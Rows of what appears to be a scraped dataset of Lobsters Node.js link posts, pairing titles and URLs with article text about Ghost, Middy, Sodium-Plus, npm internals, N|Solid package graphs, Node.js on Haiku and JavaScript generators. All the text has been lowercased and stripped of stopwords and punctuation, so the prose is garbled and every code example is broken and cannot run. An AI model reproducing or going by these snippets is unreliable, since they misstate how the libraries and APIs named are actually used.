ghost theme production process manually making zip navigating ghost admin uploading update browser pretty arduous timecasper combination jamstack work make great admin api github mean incredibly easy continuously sync custom ghost theme live production site every new commit create new custom integration ghost copy admin api key repository secret token copy paste template github action workflowyaml examplea brand new wordpress migration pluginwe launched ghost basic wordpress migrator plugin proceeded neglect year making exceedingly difficult anyone move data platform smooth experiencethat change today overhauled wordpress migration plugin new plugin provides singlebuttondownload full wordpress content image archive format dragged dropped ghost importer infinitely better experience round fully compatible ghost belongs entirely nathan jeffery singlehandedly took rewriting plugin u open source contributor incredible job immensely grateful helphow get ghost new site ghost pro running ghost spin new site click unrestricted day free trial tried ghost great time give fresh shot already got site ghost pro automatically upgraded like expedite process log ghostorg click upgrade button selfhosting ghost upgrading straightforward ghostcli take min ghost update guidewhat coming nextghost first step totally new set usecases feature keen hear feedback using member ghost forum come help github interested part building next feature along usnearly everything open source always use help know someone would interested share new business model independent publishing major upgrade native membership subscription full jamstack support ton new integration automation github action detail question comment hanging day product hunt
79,Lobsters,nodejs,Node.js programming,zero: node.js graphics/shader pipeline,https://github.com/sinclairzx81/zero,zero nodejs graphicsshader pipeline,zero overview building locally,zero graphic pipeline implemented javascript rendered terminal gpu required start demo ascii mode default npx zerodemo latest start demo true color mode experimental npx zerodemo latest color overview zero small graphic demo us javascript replicate functionality gpu us terminal display rendered output via nodejs stdout zero written fun push javascript performance ascii rendering tested window osx linux terminal ansi true color rendering tested cygwin window linux mint terminal work terminal support true color project associative material offered anyone may find use zero implement programmable vertex fragment shaders javascript perspective zcorrect texture mapping per pixel depth buffering adaptive resolution terminal resize tty support true color terminal must support color matrix vector math library scene graph licence mit building locally clone project run following terminal npm install npm run build run node index
80,Lobsters,nodejs,Node.js programming,Human-friendly process signals,https://github.com/ehmicky/human-signals,humanfriendly process signal,example install usage signalsbyname name signal object signalsbynumber number signal object signal name number description supported osspecific action forced standard support submit issue github chat u gitter code conduct contributing guideline,humanfriendly process signal map known process signal information signal unlike osconstantssignals includes example const signalsbyname signalsbynumber require humansignals consolelog signalsbynamesigint name sigint number description user interruption ctrlc supported true action terminate forced false standard ansi consolelog signalsbynumber name sigfpe number description floating point arithmetic error supported true action core forced false standard ansi install npm install humansignals usage signalsbyname type object object whose key signal name value signal object signalsbynumber type object object whose key signal number value signal object signal type object signal object following property name type string standard name signal example sigint number type number code number signal example number crossplatform different different o description type string humanfriendly description signal example user interruption ctrlc supported type boolean whether current o handle signal nodejs using processon name handler list supported signal osspecific action type string enum terminate core ignore pause unpause default action signal handled forced type boolean whether signal default action prevented true sigterm sigkill sigstop standard type string enum ansi posix bsd systemv standard defined signal support found bug would like new feature nt hesitate submit issue github question feel free chat u gitter everyone welcome regardless personal background enforce code conduct order promote positive inclusive environment contributing project made simplest way give back starring sharing online documentation unclear typo please click page edit button pencil icon suggest correction would like help u fix bug add new feature please check guideline pull request welcome thanks go wonderful contributor
81,Lobsters,nodejs,Node.js programming,The stylish Node.js middleware engine for AWS Lambda,https://github.com/middyjs/middy,stylish nodejs middleware engine aws lambda,stylish nodejs middleware engine aws lambda note upgrading middy check upgrade instruction middy install quick example express fastify hapi middleware pattern usage inline middlewares writing middleware section work execution order interrupt middleware execution early note handling error promise support using asyncawait asyncawait babel promise error handling writing middleware configurable middlewares inline middlewares inline middlewares detail creating middlewares code existing middlewares faq q warning promise support available middlewares community generated middleware open pull request contributing raise issue submit pull request code conduct release manual license mit license middy team,stylish nodejs middleware engine aws lambda note upgrading middy check upgrade instruction middy middy simple middleware engine allows simplify aws lambda code using nodejs used web framework like express familiar concept adopted middy able get started quickly middleware engine allows focus strict business logic lambda attach additional common element like authentication authorization validation serialization etc modular reusable way decorating main business logic install install middy use npm npm install save middycore using typescript also want make sure installed typesawslambda peerdependency npm install savedev typesawslambda quick example code better word let jump example let assume building json api process payment handlerjs import core const middy require middycore import middlewares const jsonbodyparser require middyhttpjsonbodyparser const httperrorhandler require middyhttperrorhandler const validator require middyvalidator common handler way different used every day aws lambda const processpayment event context callback nt need deserialize body ourself middleware used const creditcardnumber expirymonth expiryyear cvc nameoncard amount eventbody stuff data return callback null result success message payment processed correctly notice handler added base business logic deserialization validation error handler add rest middlewares const inputschema type object property body type object property creditcardnumber type string minlength maxlength pattern expirymonth type integer minimum maximum expiryyear type integer minimum maximum cvc type string minlength maxlength pattern nameoncard type string amount type number required creditcardnumber insert required event property let middyfy handler able attach middlewares const handler middy processpayment use jsonbodyparser par request body json convert object use validator inputschema validates input use httperrorhandler handle common http error return proper response moduleexports handler one main strength serverless aws lambda developer perspective focus mostly shifted toward implementing business logic anyway writing handler still deal common technical concern outside business logic like input parsing validation output serialization error handling etc often necessary code end polluting pure business logic code handler making code harder read maintain context like generic web framework express fastify hapi etc problem solved using middleware pattern pattern allows developer isolate common technical concern step decorate main business logic code middleware function generally written independent module plugged application configuration step thus polluting main business logic code remains clean readable easy maintain since could nt find similar approach aws lambda handler decided create middy middleware framework serverless aws land usage might already seen first example using middy simple requires step write lambda handler usual focusing mostly implementing bare business logic import middy middlewares want use wrap handler middy factory function return new enhanced instance original handler able attach middlewares need attach middlewares need using function use somemiddleware example const middy require middycore const require const require const require const originalhandler event context callback business logic const handler middy originalhandler handler use use use moduleexports handler use take single middleware array middlewares attach multiple middlewares single call const middy require middycore const require const require const require const middlewares const originalhandler event context callback business logic const handler middy originalhandler handleruse middlewares moduleexports handler also attach inline middlewares using function onerror detailed use case example check writing middleware section work middy implement classic onionlike middleware pattern peculiar detail attach new middleware wrap business logic contained handler two separate step another middleware attached wrap handler wrapped previously added middlewares order creating multiple layer interacting request event response way requestresponse cycle flow middlewares handler middlewares giving opportunity within every step modify enrich current request context response execution order middlewares two phase phase happens handler executed code response created yet access request phase happens handler executed code access request response three middlewares attached image expected order execution handler notice phase middlewares executed inverted order way first handler attached one highest priority first able change request last able modify response get sent user interrupt middleware execution early middlewares might need stop whole execution flow return response immediately want invoke handlercallback middleware return early without invoking next note totally stop execution successive middlewares phase return early response error directly lambda level middlewares specific task every request like output serialization error handling wo nt invoked case example use capability building sample caching middleware function calculates cache id based current event const calculatecacheid event const storage middleware const cachemiddleware option let cachekey return handler next cachekey optionscalculatecacheid handlerevent optionsstoragehasownproperty cachekey exit early return value cache already return handlercallback null optionsstorage cachekey return next handler next store calculated response cache optionsstorage cachekey handlerresponse next sample usage const handler middy event context callback use cachemiddleware calculatecacheid storage handling error happens error error regular control flow stopped execution moved back middlewares implemented special phase called onerror following order attached every onerror middleware decide handle error create proper response delegate error next middleware middleware handle error creates response execution still propagated error middlewares chance update replace response needed end error middlewares sequence response returned user middleware manages error lambda execution fails reporting unmanaged error promise support middy allows return promise throw error handler instead calling callback middlewares instead calling next example handler return promise middy event context callback return someasyncstuff return someotherasyncstuff return foo bar example middleware return similar promise const asyncvalidator handler handlereventbody return someasyncstuff handlereventbody return foo bar return promiseresolve handleruse asyncvalidator using asyncawait nodejs support asyncawait allowing work promise way make handling asynchronous logic easier reason asynchronous code easier read still use asyncawait running aws lambda nodejs need transpile asyncawait code eg using babel take following code example handler written asyncawait middy async event context await someasyncstuff await someotherasyncstuff return foo bar example middleware written asyncawait const asyncvalidator async handler handlereventbody await asyncvalidate handlereventbody return foo bar return handleruse asyncvalidator promise error handling onerror middlewares return promise well middy handle return value promiseenabled error handler onerror promise resolve truthy value value treated error passed pipeline onerror handler loggerdebug return promiseresolve handlererror onerror handler loggerdebug return promiseresolve handlererror handleruse use first called last onerror chain return promise resolve value lambda fails report unmanaged error example lambda fail report error returned onerror promise resolve falsy value null undefined false etc error handling pipeline continues eventually response returned without error const onerror handler handlerresponse error handlererror return promiseresolve resolve falsy value const onerror handler return promiseresolve handlererror handleruse use called rest error handler skipped lambda finish normally return response called onerror promise reject error handling pipeline exit early lambda execution fails const onerror handler return promisereject handlererror const onerror handler return promiseresolve handlererror handleruse use called lambda fail early reporting error called writing middleware middleware object contain least possible key function executed phase function executed phase onerror function executed case error onerror function need following signature function handler next handler reference current context allows access modification current event request response phase error case error next callback function need invoked middleware finished job next middleware invoked configurable middlewares order make middlewares configurable generally exported function accepts configuration object function return middleware object onerror key eg mymiddlewarejs const mymiddleware config might set default option config return handler next might read option config handler next might read option config onerror handler next might read option config moduleexports mymiddleware convention mind using middleware always look like following example const middy require middycore const mymiddleware require mymiddleware const handler middy event context callback stuff handleruse mymiddleware foo bar moduleexports handler inline middlewares sometimes want create handler serve small need necessarily reusable case probably need hook one different phase onerror case use inline middlewares shortcut function hook logic middy control flow let see inline middlewares work simple example const middy require middycore const handler middy event context callback stuff handlerbefore handler next something phase next handlerafter handler next something phase next handleronerror handler next something error phase next moduleexports handler see middy instance also expose onerror method allow quickly hook simple inline middlewares detail creating middlewares check code existing middlewares see example write middleware faq q contextdone called twice within handler warning probably trying use callback inside async handler next inside async middleware async handler middlewares return promise calling function needed see promise support example available middlewares currently available middlewares community generated middleware following middlewares created maintained outside project guarantee functionality middleware missing feel free open pull request contributing spirit open source software everyone welcome contribute repository feel free raise issue submit pull request contributing project make sure look code conduct maintainer want release new version middy consult dedicated release manual license licensed mit license copyright c luciano mammino middy team
82,Lobsters,nodejs,Node.js programming,Improving the Cryptography of the JavaScript Ecosystem,https://paragonie.com/blog/2019/10/improving-cryptography-javascript-ecosystem,improving cryptography javascript ecosystem,javascript cryptography considered harmful changed immensely time javascript cryptography considered pie already done javascript cryptography sodiumplus positive experience j cryptography sodiumplus posted devto sodiumnative libsodiumwrappers sodiumplus documentation certaintyjs cacert management javascript project certainty certaintyjs ciphersweetjs ciphersweet ciphersweetjs website work continues reach u write code audit code offer consultation security design,eight year since javascript cryptography considered harmful published true today eight year ago javascript cryptography web browser dangerous ecosystem changed immensely time javascript cryptography considered continued rise popularity javascript framework eg react prevalence crossplatform development tool cordova electron possible write javascript code deploy web server webpage browser extension native mobile app desktop software change javascript code despite eight year transformative change programming landscape javascript ecosystem severely neglected security industry especially regard usable cryptography pie already done javascript cryptography sodiumplus positive experience j cryptography month released sodiumplus pluggable crossplatform typesafe interface libsodium make easier write safe secure javascript cryptography code initial announcement posted devto clear nt new libsodium binding sodiumplus wrap one existing binding eg sodiumnative unpleasant lowlevel binding api work interact using sane simple asynchronous api instead writing code like const sodium require sodiumnative key generation let alicesecret bufferalloc let alicepublic bufferalloc let bobsecret bufferalloc let bobpublic bufferalloc sodiumcryptoboxkeypair alicepublic alicesecret sodiumcryptoboxkeypair bobpublic bobsecret nonce let nonce bufferalloc sodiumrandombytesbuf nonce plaintext let message string want encrypt let plaintext bufferfrom message encrypt let ciphertext bufferalloc plaintextlength sodiumcryptoboxeasy ciphertext plaintext nonce bobpublic alicesecret consolelog ciphertexttostring hex decrypt let decrypted bufferalloc ciphertextlength sodiumcryptoboxopeneasy decrypted ciphertext nonce alicepublic bobsecret consolelog decryptedtostring write const sodiumplus require sodiumplus let sodium async function sodium sodium await sodiumplusauto let alicekeypair await sodiumcryptoboxkeypair let alicesecret await sodiumcryptoboxsecretkey alicekeypair let alicepublic await sodiumcryptoboxpublickey alicekeypair let bobkeypair await sodiumcryptoboxkeypair let bobsecret await sodiumcryptoboxsecretkey bobkeypair let bobpublic await sodiumcryptoboxpublickey bobkeypair let nonce await sodiumrandombytesbuf let plaintext message go let ciphertext await sodiumcryptobox plaintext nonce alicesecret bobpublic consolelog ciphertexttostring hex let decrypted await sodiumcryptoboxopen ciphertext nonce bobsecret alicepublic consolelog decryptedtostring second snippet work browser browser extension mobile apps desktop apps webservers without requiring c compiler integrated javascript toolkit default sodiumplus us libsodiumwrappers however sodiumnative installed opportunistically use first since sodiumnative offer much better performance one many feature included sodiumplus typesafety cryptography key used cryptobox cryptosign prevents whole host usage mistake passing around bare buffer object prevent check sodiumplus documentation information certaintyjs cacert management javascript project originally created certainty solve problem developer disabling ssltls verification many case actually symptom unreliableoutdated cacert bundle problem recently congruent mean autoupdating cacert bundle nodejs developer decided write certaintyjs const certainty require certaintyjs const http require requestpromisenative async function let option ca await certaintygetlatestcabundle pathtodirectory uri http phpchroniclepiehostedcomchroniclelasthash minversion strictssl true timeout send request consolelog await httpget option next release certaintyjs include localcacertbuilder feature php version well refactor use sodiumplus ciphersweetjs scenario need encrypt database field still need use field select query somehow secure way achieve result without invoke lot new experimental cryptography primitive turn yes proposed implementation called ciphersweet ciphersweet already ported php nodejs language coming soon find ciphersweetjs github documentation available website work continues like many programming language javascript need unique challenge remain committed improving security usability language framework tool developer want use strive towards private secure internet everyone company relies php javascript code need expert assistance solving cryptography problem application reach u write code audit code offer consultation security design
83,Lobsters,nodejs,Node.js programming,An Old Bug,https://blog.npmjs.org/post/186190819147/an-old-bug,old bug,weird line fixed modified without even really noticing npmcliarborist original inception module,recently happened across weird line readpackagetree reading code see might get started implementing workspace npm cliat time deep flow reading code tracing flow various part system strike important thought oh obviously wrong fixed without second thought tried integrate change back mainline cli readpackagetree version however realized foundit might seem weird first provide contextthe readpackagetree module read tree package nodemodules folder dependency resolution figure tree need modified install update provide basic data structure subsequently modified within npm cli installer codebase importantly load node object parent child link themnodejs module loader subtle important property make lot npm magic possible made good choice year way create cli utility module node call require foo node look nodemodules hierarchy find foo module however importantly package symlinked another location module resolution process run based target location link locationthis example symlink usrlocalbinnpm point usrlocallibnodemodulesnpmbinnpmclijs program updated carry dependency along multiple different version dependency loaded node program time providing release valve dependency constraint solver thus avoiding dependency hellso back weird line context file bit code loading child given node order match node module resolution algorithm reading target loading child rather treating link parentin mindset general code cleanup modified without even really noticing mistakenly let slip past completely unrelated commitwhen tried integrate readpackagetree change npm cli bunch test broke really bizarre way hit going lot strange cli behavior year started make ton sense like occasionally manually symlinked module would result dependency stripped away mutated way seemed make sense sure people someone probably comfortable module system often mess project reckless abandon prior npm deduplication default installation happened naive run parallel fetch whatever still needed level kind way dumb mostly good way result occasionally get copy something would fine also meant proper progress bar impossible since installer way knowing would done simple loop detection helped know eventually would done exactly year npm lot bugfixes logic added work around issue one subtle mistake caused result fixing however mean fixing bug break lot stuff work fine today good news npm workspace installer completely refactored npmcliarborist trivial implementout idle curiosity tracked bug snuck though pretty sure already knew answer date back original inception readpackagetree module really caught fixed well tspotted past self redhanded messing usual sneaking bug code ever catch guy quite thing answer
84,Lobsters,nodejs,Node.js programming,Is Guy Fieri in Your Node.js Packages?,http://nodesource.com/blog/is-guy-fieri-in-your-node-js-packages/,guy fieri nodejs package,satirical blog post medium security vulnerability nsolid quick start page understanding output duplicated visualizing data graph graphviz emscripten using nsolid application command github repo nodesource nspackagegraph,share recent satirical blog post medium claimed image guy fieri embedded babelcore package nt worry author fun definitely image guy fieri embedded babelcore package blog post funny make point get thinking package application using even know package application using likely familiar toplevel package application use listed packagejson dependency tip iceberg package depend nsolid help nsolid cli provides packageinfo command packageinfodoc return list package loaded running application along version number dependency package location disk package nsolid console make use command part security vulnerability feature let take look output packageinfo command running small node module module us async lodash package available npm use strict require async require lodash consolelog waiting press ctrlc setinterval function corresponding packagejson file get async lodash package loaded nodemodules directory use name version dependency async lodash let run program nsolid nt already nsolid installed install following direction nsolid quick start page nsolid waiting press ctrlc leave program running open another terminal window run command indicated run nsolidcli l command see application nsolidcli l pid hostname app address id id let run packageinfo command using value id property l command value id argument nsolidcli app id id packageinfo output similar shown expanded readability package path name version dependency nodemodulesasync nodemoduleslodash path name async main distasyncjs version dependency lodash path name lodash main lodashjs version dependency note brevity removed two property package array element main module understanding packageinfo output let unpack going expected three package async lodash package dependency property array whose element packagerelative path dependent package dependency element resolved path project yield new path path property one toplevel package element example async dependency lodash would resolve lodash would yield path property last package element following process construct graph data structure package point exact package depends might think path package important aspect output ca nt deal package name version number possible however node load multiple copy version package located different path known duplicated aka duped package perfect world application would nt duplicated package reality package application us better chance duplicated package npm subcommand dedupe fix issue duplicated package moving package dependency graph package access version package instead copy nodemodules directory mitigated extent npm version better job preventing duplicated package created first place visualizing data graph output showing three package something human look make sense fairly easily however application probably made three package analyze package dependency anything small program going need kind tool slice dice data present easier understand way package dependency form nice graph data structure tool deal graph useful one favorite tool analyzing data graph graphviz graphviz create sampledot file following content match sample output term dependency digraph package sample async sample depends async sample lodash sample depends lodash async lodash async depends lodash defines three node graph named package name version operator indicates directed connection two node case connection mean depends create png image dot file using graphviz command line program dot dot png samplepng sampledot resulting image nice graphviz handle complicated data graph provides extensive styling support produce output variety format possible write program read output packageinfo command generates dot file entire dependency graph converted image published command line tool called nspackagegraph exactly use tool create dot svg html file visualization particular nsolid process tool collect packageinfo data morphs nice graphviz dot file us emscriptenized version graphviz create svg file optionally create html file embeds svg content small html wrapper although usually view svg file web browser html file tool generates provides better experience using nspackagegraph nsolid application let walk using nspackagegraph slightly complex application first sample new sample module use strict const path require path require request require express processtitle pathbasename dirname consolelog waiting press ctrlc setinterval function corresponding packagejson name version dependency express request difference previous sample package depends sample us request express package previous example used async lodash async package dependency lodash lodash dependency request express package hand contain large number nested dependency let start program running nsolid waiting press ctrlc generate package graph application running run one nspackagegraph nspackagegraph format html thumbnail output link output file html visualization easiest navigate easily see two subtrees two dependency share common package dependency besides showing package dependency structure via package hexagon arrow hexagon drawn one three colored background green yellow red yellow red color indicate amount package duplication yellow mean multiple version package used time application red mean exact version specific package loaded different path yellow show opportunity change dependency version package load single version package rather multiple red show duplicated package described probably one copy version package loaded npm dedupe command command using npm version instead help fix prevent duplicated package application another set visualization time nodejs npm program shrunkenforthebrowser version png file nspackagegraph package positive first step visualizing package application using optimize size nodemodules directory thankfully prevent even satirical post medium thing outlined check github repo information love see create tweet nodesource hashtag nspackagegraph share package graph
85,Lobsters,nodejs,Node.js programming,Sodium-Plus: A Positive Cryptography Experience for JavaScript Developers,https://dev.to/paragonie/sodium-plus-a-positive-cryptography-experience-for-javascript-developers-2p08,sodiumplus positive cryptography experience javascript developer,followup article use libsodium sodiumnative libsodiumwrappers encrypting string sodiumnative encrypting string libsodiumjs difference design wart first two sentence official libsodium documentation introducing sodiumplus na pluggable asynchronous fully typesafe project status get sodiumplus,update also published followup article bit broader scope ask around implementing encryption signature apps chance someone tell use libsodium truthfully correct answer people problem however incumbent option libsodium javascript ecosystem leave lot desired particular two backend library implement libsodium javascript discussing sodiumnative unopinionated lowlevel binding c api libsodiumwrappers package libsodiumjs repository crossplatform slightly slower sodiumnative encrypting string sodiumnative bet think could call day const sodium require sodiumnative initialize random byte let key sodiumrandombytesbuf let nonce sodiumrandombytesbuf let message example string hello devto reader encrypt let encrypted sodiumcryptosecretboxeasy message nonce key decrypt let decrypted sodiumcryptosecretboxopeneasy encrypted nonce key consolelog message decryptedtostring short sweet point right nope code nt work snippet code need written like const sodium require sodiumnative initialize random byte let key sodiumrandombytesbuf let nonce sodiumrandombytesbuf let message bufferfrom example string hello devto reader encrypt let encrypted bufferalloc messagelength sodiumcryptosecretboxeasy encrypted message nonce key decrypt let decrypted bufferalloc encryptedlength sodiumcryptosecretboxopeneasy decrypted encrypted nonce key consolelog messagetostring decryptedtostring api terrible javascript developer instead returning value sodiumnative overwrites one buffer pas return value mean allocate correctly size buffer manual buffer allocation especially nodejs devs learned bufferalloc bufferfrom became norm almost begs developer write memory unsafe code also break user provides string input instead buffer encrypting string libsodiumjs fortunately libsodiumwrappers fairly good job exposing usable case except one caveat const sodium require libsodiumwrappers await sodiumready ca nt use library ready const sodium sodium henceforth api consists entirely synchronous function const sodium require libsodiumwrappers async function await sodiumready const sodium sodium initialize random byte let key sodiumrandombytesbuf let nonce sodiumrandombytesbuf let message example string hello devto reader encrypt let encrypted sodiumcryptosecretboxeasy message nonce key decrypt let decrypted sodiumcryptosecretboxopeneasy encrypted nonce key consolelog message decryptedtostring difference design wart compared sodiumnative libsodiumwrappers slightly slower sodiumnative call c library libsodiumwrappers compiles library emscripten run place ie web browser nt need c compiler get running library suffer subtle risk keypairs easy accidentally get public secret key argument mixed make protocol insecure although unit test still pas neither library work well ide code completion neither library particularly welldocumented either grievance developer asked today two use greenfield development project would nt able recommend either really sad first two sentence official libsodium documentation state sodium modern easytouse software library encryption decryption signature password hashing portable crosscompilable installable packageable fork nacl compatible api extended api improve usability even mind like introduce sodiumplus world introducing sodiumplus na sodiumplus libsodium api javascript developer deserve const sodiumplus require sodiumplus async function select backend automatically let sodium await sodiumplusauto let key await sodiumcryptosecretboxkeygen let nonce await sodiumrandombytesbuf let message test message message string buffer array etc let ciphertext await sodiumcryptosecretbox message nonce key consolelog ciphertext try let decrypted await sodiumcryptosecretboxopen ciphertext nonce key consolelog decryptedtostring catch e consoleerror invalid ciphertext throw instead returning false pluggable power either sodiumnative strictly node shop need performance libsodiumwrappers need crossplatform support even install sodiumnative build sodiumplus automatically use default configuration asynchronous ever possible fully typesafe never accidentally get public secret key mixed sodiumplus const sodiumplus require sodiumplus async function select backend automatically let sodium await sodiumplusauto consolelog selected backend sodiumgetbackendname let alicekeypair await sodiumcryptoboxkeypair let alicesecret await sodiumcryptoboxsecretkey alicekeypair let alicepublic await sodiumcryptoboxpublickey alicekeypair work let ciphertext await sodiumcryptoboxseal plaintext alicepublic let decrypted await sodiumcryptoboxsealopen ciphertext alicepublic alicesecret try ciphertext await sodiumcryptoboxseal plaintext alicesecret catch e decrypted await sodiumcryptoboxsealopen ciphertext alicesecret alicepublic consolelog e typeerror feel free run code without sodiumnative virtually every way want sodiumplus significant usability improvement existing libsodium implementation additionally want make sure easier use sodiumplus javascript cryptography library project status version first alpha released contains common feature libsodium many apis generichash secretstream etc yet implemented library documentation completed yet implemented however ide autocomplete correctly due use docblocks development roadmap follows initial release collect feedback developer love help api completeness aka finish wrapping library complete documentation ensure unit test coverage ensure type bundle available typescript user maybe get security audit sure funding exists yet version expected late get sodiumplus
86,Lobsters,nodejs,Node.js programming,Node.js now available in Haiku,https://www.haiku-os.org/blog/return0e/2019-09-19_nodejs_now_available_in_haiku/,nodejs available haiku,nodejs available haiku,nodejs available haikutldr pkgman install nodejsas already known long time many platform support writing software javascript typescript help nodejs runtime year much software written developer day gradually written either language however haiku lacked nodejs port quite sometime possible run develop javascript based software library depended nodejs runtime say nodejs available haiku downloaded haikudepot bit bit support worked version currently available already updated latest version time writing support upcoming lts version also coming haikuports several patch upstreamed member haikuports team project libuv crossplatform async io library gn etc hope upstream larger project like google javascript engine used chromium qtwebengine nodejs project ease bringup future node lts release haikuto install nodejs haiku search package haikudepot click install type pkgman install nodejs haiku terminal automatically install everythingso actually mean u user well directly install run software javascript typescript ecosystem using npm node package manager yarn package work right box example package running system react typescript angular typescript simple express web server socketio chat demonstration creating static site via hexo also possible attach node program remote debugging via chrome inspector remotely screenshots nodejs running haiku machine remotely debugged chrome macos please note since early port new operating system expected several package require platform recognition function correctly therefore package work unmodified would require patch relation feature port currently unavailable file system event fsevents used watching file change filesystem haiku ability monitor file system event plan integrate node port futurethere also growing interest possibility writing gui apps javascripttypescript via wrapper around haiku api thanks port possible interface haiku c api using nbind wrap c class method automatically called javascript plan binding create idiomatic jsts api allow developer quickly use api without difficulty released next week code prepared opensource release screenshot haiku app large button sending notification window manager appserver haiku javascript binding demonstration would like thank involved making port possible would possible without contribution following
87,Lobsters,nodejs,Node.js programming,Asynchronous Generators and the Unix-like async piping pattern,https://dev.to/jfet97/javascript-iterators-and-generators-asynchronous-generators-2n4e,asynchronous generator unixlike async piping pattern,introduction asynchronous generator function async function generator compose generator async function asynchronous generator next throw return promise paused running resume iteration method async generator asynciterator async iterables first async generator yieldon awaitoff pro iteratorresult yielded promise implicitly next next async realm complex reallife example iteratorresult generator piping pipe yielded synchronous piping asynchronous piping asynciterator byte piping iiafe conclusion asynchronous generator generator piping javascript iterators generator twitter acknowledgement nicolò ribaudo marco iamonte bibliography,introduction time asynchronous generator excited excited kinda exotic type function added language time async iterators answer question async function generator compose think async generator still generator nt lot conceptual concrete usage difference sync counterpart async generator async function await keywords used inside previous question reworded follows yield keyword work conjunction await keyword asynchronous generator answer involves state machine queue plus clever algorithm damn well explained trying summarize simplify time nextthrowreturn method called promise immediately returned call enqueued async generator instance two state paused running paused state mean instance waiting start paused yield case call enqueued resume generator next yielded value next thrown error used fulfil reject promise previously returned call generator could running state mean awaiting async operation therefore still handling previous iteration method call new one must nt side effect generator instance state queued circle closed time yield keyword encountered least one enqueued call generator wo nt pause oldest enqueued call dequeued handled generator continue flow although clear enough point want stress object returned async generator implement asynciterator interface saw last article therefore perfect create async iterables moreover implicit iteration method call queue contrasting possible high consumer pressure fact async iterators returned async iterables well remember return convention last least impossibility returning promise iteration result value following spec hint excellent reason preferring async generator manual implementation async iteration interface first async generator let revisit remotepostsasynciteratorsfactory built previous article code selfexplanatory enough async function remotepostsasyncgenerator let true const re await fetch http jsonplaceholdertypicodecomposts r rjson remote post available break infinite loop async iteration end objectkeys re length break yield re act yielding something yet could sound weird remember temporally ordered set promise involved fulfilled data become available surely noticed qualitative leap respect previous manual implementation async iteration interface although async generator seem scary intimidating first help u write clear compact effective code despite considerable level abstraction yieldon awaitoff let become confident behaviour two keywords wait completion promise yield fulfilment value const asyncsource async symbolasynciterator const v await new promise re settimeout re yield v one line like true programmer const asyncsource async symbolasynciterator yield await new promise re settimeout re case avoid using await keyword come async iteration iteratorresult value never promise therefore async generator wo nt let promise pas yielded promise implicitly awaited const asyncsource async symbolasynciterator yield new promise re settimeout re otherwise plan insert promise generator using next method manually await const asyncsource async symbolasynciterator good old operator precedence const nextargument await yield next script good test know understood await yield work together const asyncsource async symbolasynciterator consolelog await new promise re settimeout re consolelog await new promise re settimeout re yield const ait asyncsource symbolasynciterator aitnext value consolelog value log could tempted think since already known almost immediately returned async generator work promise instantly returned next method resolution deferred first yield encountered every consideration made sync generator like behaviour trycatch block generator delegation also apply async variant therefore chose follow dry approach keep mind async generator work async realm fulfilled rejected promise used instead spatial value exception aware yield keyword support async sync iterables us conversion process similar one adopted forawaitof complex reallife example following possible approach case remote resource strict limit number request fetch data one request want handle smaller chunk remember function chunkify array n yield arrayslice n arraylength n yield chunkify arrayslice n n async function getremotedata let hasmore true let page hasmore const nextpage result await fetch url params page r rjson return element iteration yield chunkify result hasmore nextpage null page nextpage iteration getremotedata return one chunk previously fetched array thanks delegation chunkify sometimes generator fetch another bunch data remote source sometimes difference consumer point view noteworthy iteratorresult strictly dependent previous one iteration could last local array result global furthermore get next bunch data need previous nextpage would impossible maintain consistency without queuing logic async generator generator piping powerful pattern conceptually similar unix piping based fact generator produce iteratoriterable iterated overall idea combine multiple generator sequentially like pipe combine multiple process feeding generator value yielded one precedes generator able whatever want value many pretty interesting thing done sync async simply logging debugging purpose completely transforming yielding satisfy given condition yield composition two compound generator required yield frequency therefore outer able iterate inner yielding something equally capable producing one value using one chunk data received source synchronous piping better understand idea let start something easy sync let say collection number want multiply one subtract finally remove nonmultiples function multiplybytwo source const value source yield value function minusone source const value source yield value function ismultipleofthree source const value source value yield value const collection piping ismultipleofthree minusone multiplybytwo collection consideration make first concern high reusability maintainability extensibility approach generator expects iterable interface know nothing source furthermore produce another iterable nt need know anything consumer compose function want reusing whenever need second memory efficiency unlike array method map flatmap filter nt collection recreated scratch step pipeline value flow source end generator discard remarkable resemblance transducer asynchronous piping also applicable async realm thanks async generator let consider fairly widespread example reading file using nodejs stream async iterables yaffee async function iiafe const filestream new filereaderbylines testtxt await const line filestream consolelog line creating instance filereaderbylines class examine shortly asynchronously iterating thanks forawaitof loop filereaderbylines class const f require f transform chunk line async function chunkstolines chunkssource let previous await const chunk chunkssource previous chunk let eolindex eolindex previousindexof n const line previousslice eolindex yield line previous previousslice eolindex previouslength yield previous class filereaderbylines constructor file thisfile file symbolasynciterator const readstream fscreatereadstream thisfile encoding highwatermark piping readstream produce async iterable chunk file feed chunkstolines chunkstolines produce async iterable return return chunkstolines readstream let explain happening asynciterator method take care handling data source file using readable stream call fscreatereadstream method creates stream setting file read encoding used file maximum size internal buffer dimension chunk data returned stream byte stream iterated return content asynchronously filled buffer becomes available following forawaitof used outcome would printing whole file byte time await const buffer readstream consolelog buffer instead using piping pattern transform one necessary byte long chunk line compose async iterable returned fscreatereadstream chunkstolines async generator take async iterable return another one latter async iteration return line chunk noteworthy time two async iterables produce value different frequency iiafe level could choose weird reason capitalize line easily inserting another async generator pipeline async function capitalize asyncsource await const string asyncsource yield string touppercase stringslice yaffee async function iiafe const filestream new filereaderbylines testtxt await const line capitalize filestream piping consolelog line way composing async iterable filestream capitalize another async generator take async iterable return fresh new one latter async iteration return capitalized line conclusion folk learnt need asynchronous generator work used build amazing thing thanks creating wellformed async iterables breeze also learnt sync async generator piping powerful pattern sure expand horizon enjoyed journey javascript iterators generator please help share many j developer possible usual hope see twitter acknowledgement would like thank nicolò ribaudo marco iamonte time spent helping improve quality article bibliography
88,Lobsters,nodejs,Node.js programming,In-Depth Overview of Synchronous Generators,https://dev.to/jfet97/javascript-iterators-and-generators-synchronous-generators-3ai4,indepth overview synchronous generator,introduction function pause reduxsaga hertzscript tjco generator anonymous generator yield generator object iterators generatorobject iterator iterable generator object next iterator result next false next resuming execution next convention discussed previous article yielded returned yielded returned return return remember undefinedtrue generator instance messaging system operator operand next first time first next first next next second time third next second third third fourth next return next nth next th nth returned nth next first next generator iterators iterables generator object array spread operator iterator iterableiterator error handling including yield keyword throw early return return generator delegation bridge generator delegation next throw return iterables iterator recursive generator delegate exception behaviour throw method next fourth throw throw behaviour return keyword return behaviour return method return next throw return return delegated method call next throw return return whole iteration stopped return return refactoring iterables iterable iterator iterables user three key true value fibonacciproducer next conclusion iterators generator asynchronous iterators twitter acknowledgement nicolò maria mezzopera vuejs vueandme bibliography,introduction generator particular type function javascript used waiting completion subroutine able continue program word function run end body code able interfere running generator break rule allowing u pause execution enabling straightforward message system pas information direction function marked async keyword thanks await superpower able follow rule direct consequence generator plenty us case generator used implement iterators implement producer write asynchronous code synchronous fashion implement preemptive nonpreemptive multitasking name lot 